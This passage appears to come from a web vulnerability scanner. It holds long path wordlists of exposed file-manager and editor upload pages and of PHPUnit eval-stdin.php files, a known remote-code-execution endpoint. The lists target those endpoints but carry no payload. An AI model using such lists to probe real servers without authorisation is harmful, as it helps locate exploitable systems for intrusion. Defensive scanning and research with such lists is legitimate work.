    '/Public/statics/js/kindeditor/plugins/file_manager/file_manager.html',
    '/public/js/filemanager/',
    '/js/file_manager/',
    '/filemanager/',
    '/Filemanager/',
    '/FileManager/',
    '/filemanager/index.html',
    '/FileManager/index.html',
    '/Filemanager/index.html',
    '/js/ckeditor/plugins/filemanager/index.html',
    '/tripmanager/js/ckeditor/plugins/filemanager/index.html',
    '/js/editor/ckeditor/editor/filemanager/browser/liferay/browser.html',
    '/html/js/editor/ckeditor/editor/filemanager/browser/liferay/browser.html',
    '/editor/filemanager/browser/default/browser.html',
    '/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/editors/fckeditor/editor/filemanager/browser/default/browser.html',
    '/admin/FileManager/FileManager.php',
    '/Admin/FileManager/FileManager.php',
    '/js/JQuery/Editor/tiny_mce/plugins/filemanager/pages/fm/index.html',
    '/sys_port/js/JQuery/Editor/tiny_mce/plugins/filemanager/pages/fm/index.html',
    '/beekeeper3/public/js/filemanager/3.1.3.1/pages/fm/index.html',
    '/public/js/filemanager/3.1.3.1/pages/fm/index.html',
    '/js/filemanager/3.1.3.1/pages/fm/index.html',
    '/public/js/filemanager/pages/fm/index.html',
    '/js/filemanager/pages/fm/index.html',
    '/Content/ckeditor/plugins/Filemanager/index.html',
    '/js/Filemanager/index.html',
    '/editor3/editor/filemanager/browser/default/browser.html',
    '/editor/filemanager/browser/default/browser.html',
    '/ckeditor//filemanager/browser/default/browser.html',
    '/inc/js/fckeditor/editor/filemanager/browser/default/browser.html',
    '/CMS/Filemanager/index.html',
    '/lasso9/leap5_support/common/filemanager/index.html',
    '/application/media/ckeditor/filemanager/',
    '/assets/js/filemanager/',
    '/admin/FileManager/index.html',
    '/Admin/FileManager/index.html',
    '/admin/loadpanel.php',
    '/openrealty3/include/class/ckeditor/custom/filemanager/',
    '/include/class/ckeditor/custom/filemanager/',
    '/base/scripts/filemanager/index.html',
    '/system/tinymce/plugins/filemanager/browser.html',
    '/atweb/core/shared/js/FCKeditor/editor/filemanager/browser/default/browser.html',
    '/themes/third_party/chimper/filemanager/',
    '/fckeditor243/editor/filemanager/browser/default/browser.html',
    '/fckeditor/editor/filemanager/browser/default/browser.html',
    '/admin/includes/rte/editor/filemanager/browser/default/browser.html',
    '/admin/includes/editor/filemanager/browser/default/browser.html',
    '/km/assets/lib/kc_tn/filemanager/index.php',
    '/assets/lib/filemanager/index.php',
    '/filemanager/index.php',
    '/Scripts/Filemanager/index.html',
    '/ck/ofm?showThumbs=true&fileConnector=%2Fck%2Fofm%2Ffilemanager&viewMode=grid&space=_ROOT&type=Image',
    ]

    phpunit_paths="""/_inc/vendor/stripe/stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /_staff/cron/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /_staff/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /~champiot/Laravel E2N test/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /~champiot/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /1board/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /4walls/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /6p6/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /2018/scholarship/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /2018/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /2018/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /2019/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /2019/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /2020/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /2020/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /172410101040/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /20170811125232/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /academy2019/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /acellemail/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php
    /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /admin/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /ads_qu_merge/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /adv/advDesenvolvimento-1003/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /adv/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /adv2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /adv3/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /advDesenvolvimento-1003/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /afasio/afasio/backend_Julia/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /afasio/backend_Julia/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /afasio/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /agc_app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /albraj/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /aliceapi/authorizenet/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /aliceapi/client_billing/authorizenet/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /AlkatreszProject/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /all/spotbills/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /all/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /alpha.u2start.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /alpha/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /alquimialaravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /apde.edu.gt/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api_muvin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api_source/firebase/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api_source/webservice/firebase/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api.goover.city/release/composer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /api/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /api/vendor/phpunit/Util/PHP/eval-stdin.php
    /api1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api1/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
    /api2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api2/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
    /api3/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api3/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
    /api4/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api4/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
    /api5/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /api5/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
    /apimotor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /apitotsurvey/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /app.rideforhopebahamas.com/main-app/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /app/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /app/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /app/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /app/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /app/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /apps/shopify/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /aptapi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /argotractorsrmi.net/publichtml/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /atasem/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /atoms/raphaelfonseca/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /atoms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /auth/saml/extlib/simplesamlphp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /authenticate/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /avastar/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /b2b/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /b2bapi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /b2c/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /backend/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /backup/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /backup/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /backup/vendor/phpunit/Util/PHP/eval-stdin.php
    /bank/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /batin24/back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /batin24/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /bdi.talenta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /beatricce/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /begrand/downtown_reforma/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /begrand/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Berg/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /beta/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /betanew/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /blog/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /blog/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /blog/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /bmwstory/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /bots/globals/e_detector/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /bots/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /bowenpayments/bowenpay/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /buddha/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /bugtracker/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /bugtracker/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /byroernne/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /c2b/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /c2c/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /cafe50/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /cag/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /campuslag/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /careers/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /casadosvidros/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /client_billing/authorizenet/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /client/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /client/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /clientes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /clinicasoftware/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /clinicasoftware/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Cloudflare-CPanel-7.0.1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /cms/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /Code/snippets/html2pdf-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /compareip/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /composer-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /concrete/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /consulation/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /contact/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /core/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /core/Datavase/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /core/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /core/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /core/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /core/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /core/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /crea2019/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /crm/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /cron/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /cron/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /cronlab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /csbank/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ctevt/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /curso-styde/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /darm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /database/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /datagen/emrDataGenerator/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /datagen/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /demo/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /demo/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /demo/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /demo/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /demo/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /demos/dev_grupo_total/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /demos/laravel-sites/dev_grupo_total/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /denuncias/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /deportes/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /deportes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev_grupo_total/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev_zarrel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev/intranet-broken/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev/iscent/releases/20170811125232/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /dev/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /dev/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /dev/test1/project/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dev/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /develop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /df2communitywebsite/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /digitalscience/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /doae-production/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /dompdf-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /downtown_reforma/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /e_detector/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ecc/fashion_club/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ecc/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ecc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /elections/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /elso1000nap-foto/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /emediamarket-be/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /empresasbrasil/production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /emr/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /emrDataGenerator/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /entmain/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /enventa/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /epayco-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /epayco/epayco-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /epayco/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /epillTemporaryHolder/authenticate/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /epillTemporaryHolder/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /epos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /espanadigital/sitio/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /espanadigital/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /esurat/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /eventos-deportivos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /exapi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /experts-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /extlib/simplesamlphp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /facturacion/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /fashion_club/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /fblearn.com/usuario/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /fcma/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ferramentas/redemaisbrasil/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /framework/plugins/fb-page-feed/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /freelandadm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /fundacaodorim.oefb.com.br/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /futbol_sys/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /game/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /gdm/blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /gdpr/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /geral/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /gerenciador_dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /git/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /git/xipada/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /globals/e_detector/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /go2growApi/payment/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /go2growApi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /graph-sdk/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /greenshaded/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /gst_system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /gst/gst_system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /hammad/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /help/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /helpdesk/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /housingbook/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /htaccess/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /html/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /html/website-backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /html2pdf-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ibfv1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /id/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ifrc-laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ign-project-backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /igtny.com/igt/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ih2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /imadguennouni/all/spotbills/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /imadguennouni/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /imuva/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /inf513/curso-styde/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /inf513/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /intranet.dara.games/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /iscent/releases/20170811125232/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /iscent/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /japanese_school_website/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /jendelaku.new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /jenkins/jobs/htaccess/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /jistadx-x/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /jistadx/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /jobs/htaccess/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /jobs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /jobs/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /joshadmincom/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /kemenhub/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /khabir/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Khvorost/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /klaster-topik/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /konkurs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /kontak/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /kratikal-academy/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /krisda/stockapi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /krisda/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ktkszsz/oauth/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ktkszsz/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /laetv-laravel-respaldo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /laetv-laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /larabus/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /laravel_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /laravel-sites/dev_grupo_total/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Laravel%20E2N%20test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
    /lib/phpunit/src/Util/PHP/eval-stdin.php
    /lib/phpunit/Util/PHP/eval-stdin.php
    /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /libweb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /live/compareip/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /live/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /local/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /log_visitor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /login/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /login/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /logistics/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /lordhand.ru/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /lrp-backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mahara/auth/saml/extlib/simplesamlphp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mantis/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mantis/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /mantisbt/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mantisbt/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /market_place/mpbackoffice/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /market_place/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Matrimony/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mbdlms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /med-decision/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /messages/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /metano-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /micampo.perlo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mmdi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /modules/autoupgrade/vendor/phpunit/phpunit/src/util/php/eval-stdin.php
    /modules/gamification/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /modules/ps_facetedsearch/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /modules/pscartabandonmentpro/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /moodalmahdi/nbdsye/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mpbackoffice/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /mtosapp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /muh1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /my/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /my/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /myadmin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /MyCityVision_Backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ncufresh15/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /newsite/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
